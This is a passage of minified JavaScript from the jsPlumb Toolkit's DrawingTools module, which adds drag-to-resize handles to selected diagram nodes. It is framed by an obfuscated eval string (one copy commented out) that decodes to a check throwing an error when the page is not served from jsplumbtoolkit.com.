5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this;
    a.jsPlumbToolkit.DrawingTools = function(a) {
        var b, c, d, e, f, g, h, i, j, k = a.renderer, l = k.getToolkit(), m = k.getJsPlumb(), n = {}, o = a.widthAttribute || "w", p = a.heightAttribute || "h", q = a.leftAttribute || "left", r = a.topAttribute || "top", s = function() {
            for (var a in n) {
                var b = n[a];
                b[0] && b[0].parentNode && b[0].parentNode.removeChild(b[0]),
                delete n[a]
            }
        }, t = function(a, b, c, d) {
            var e = document.createElement(a);
            if (b && (e.className = b),
            c && c.appendChild(e),
            d)
                for (var f in d)
                    e.setAttribute(f, d[f]);
            return e
        }, u = function(a) {
            var b = n[a];
            b && b[0] && b[0].parentNode && b[0].parentNode.removeChild(b[0]),
            delete n[a]
        }, v = function(a, b) {
            var c = b.getRenderedNode(a.id);
            return u(a.id),
            c
        }, w = function(a, b) {
            var c = v(a, b);
            if (null != c) {
                var d = t("div", "jtk-draw-skeleton", c)
                  , e = c.getAttribute("jtk-x-resize")
                  , f = c.getAttribute("jtk-y-resize");
                t("div", "jtk-draw-drag", d),
                t("div", "jtk-draw-handle jtk-draw-handle-tl", d, {
                    "data-dir": "tl",
                    "data-node-id": a.id
                }),
                t("div", "jtk-draw-handle jtk-draw-handle-tr", d, {
                    "data-dir": "tr",
                    "data-node-id": a.id
                }),
                t("div", "jtk-draw-handle jtk-draw-handle-bl", d, {
                    "data-dir": "bl",
                    "data-node-id": a.id
                }),
                t("div", "jtk-draw-handle jtk-draw-handle-br", d, {
                    "data-dir": "br",
                    "data-node-id": a.id
                }),
                n[a.id] = [d, "false" !== e, "false" !== f]
            }
        }, x = function(a, d, e, f) {
            var k = {};
            return k[o] = b ? e : h - g,
            k[p] = c ? f : j - i,
            k[q] = b ? a : g,
            k[r] = c ? d : i,
            k
        }, y = {
            tl: function(a, b) {
                var c = g + a
                  , d = i + b
                  , e = h - c
                  , f = j - d;
                return c >= h && (e = c - h,
                c = h),
                d >= j && (f = d - j,
                d = j),
                x(c, d, e, f)
            },
            tr: function(a, b) {
                var c = h - g + a
                  , d = i + b
                  , e = j - d
                  , f = g;
                return c <= 0 && (f = g + c,
                c *= -1),
                d >= j && (e = d - j,
                d = j),
                x(f, d, c, e)
            },
            bl: function(a, b) {
                var c = g + a
                  , d = j - i + b
                  , e = h - c
                  , f = i;
                return c >= h && (e = c - h,
                c = h),
                d <= 0 && (f += d,
                d *= -1),
                x(c, f, e, d)
            },
            br: function(a, b) {
                var c = h - g + a
                  , d = j - i + b
                  , e = g
                  , f = i;
                return c <= 0 && (e = g + c,
                c *= -1),
                d <= 0 && (f += d,
                d *= -1),
                x(e, f, c, d)
            }
        };
        l.bind("selectionCleared", function() {
            s()
        }),
        l.bind("select", function(a) {
            w(a.obj, k)
        }),
        l.bind("deselect", function(a) {
            v(a.obj, k)
        });
        var z = function(a) {
            var b = k.mapEventLocation(a)
              , c = b.left - d.left
              , g = b.top - d.top
              , h = e(c, g, "");
            l.updateNode(f, h),
            k.setPosition(f, h[q], h[r], !0)
        }
          , A = function(a) {
            k.storePositionInModel(f.id),
            m.removeClass(document.body, "jtk-drag-select-defeat"),
            m.off(document, "mousemove", z),
            m.off(document, "mouseup", A),
            jsPlumbUtil.consume(a)
        };
        m.on(document, "mousedown", ".jtk-draw-handle", function(a) {
            var o = this.getAttribute("data-dir")
              , p = this.getAttribute("data-node-id");
            f = l.getNode(p),
            b = n[p][1],
            c = n[p][2],
            d = k.mapEventLocation(a);
            var q = k.getCoordinates(f);
            g = q.x,
            i = q.y,
            h = g + q.w,
            j = i + q.h,
            e = y[o],
            m.addClass(document.body, "jtk-drag-select-defeat"),
            m.on(document, "mousemove", z),
            m.on(document, "mouseup", A)
        })
    }
    ,
    "undefined" != typeof exports && (exports.DrawingTools = a.jsPlumbToolkit.DrawingTools)
}
.call("undefined" != typeof window ? window : this);
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B"));
